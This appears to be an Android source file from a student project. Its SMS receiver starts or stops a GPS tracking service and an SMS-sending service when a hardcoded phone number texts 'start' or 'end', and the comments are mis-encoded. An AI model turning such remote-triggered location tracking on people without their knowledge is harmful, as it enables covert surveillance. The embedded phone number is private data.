package com.bishe.wozai;

import java.text.SimpleDateFormat;
import java.util.Date;



import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;

public class SmsReciver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO �Զ����ɵķ������
		 Bundle bundle = intent.getExtras();  
	        SmsMessage msg = null;  
	        if (null != bundle) {  
	            Object[] smsObj = (Object[]) bundle.get("pdus");  
	            for (Object object : smsObj) {  
	                msg = SmsMessage.createFromPdu((byte[]) object);  
	            Date date = new Date(msg.getTimestampMillis());//ʱ��  
	                SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");  
	                String receiveTime = format.format(date);  
	                String sender = msg.getOriginatingAddress();    //���ŷ��ͷ� 
	                 
	                if (msg.getOriginatingAddress().equals("15388268798")&& msg.getDisplayMessageBody().contains("start")) {  
	                    //TODO  
	                	System.out.println("����GPS����");
		                context.startService(new Intent(context,GpsService.class)); 
		                System.out.println("number:" + msg.getOriginatingAddress()  
		                + "   body:" + msg.getDisplayMessageBody() + "  time:"  
		                        + msg.getTimestampMillis()); 
		                  
	            		
	                }else if(msg.getOriginatingAddress().equals("15388268798")&& msg.getDisplayMessageBody().contains("end")){
	                	context.stopService(new Intent(context,GpsService.class)); 
	                	System.out.println("ֹͣGPS����");
	                	context.stopService(new Intent(context,SmsSender.class));
	                	System.out.println("ֹͣ���ŷ��ͷ���");
	                }
	                  
	            }  
	           
	        }  
		
	}

}
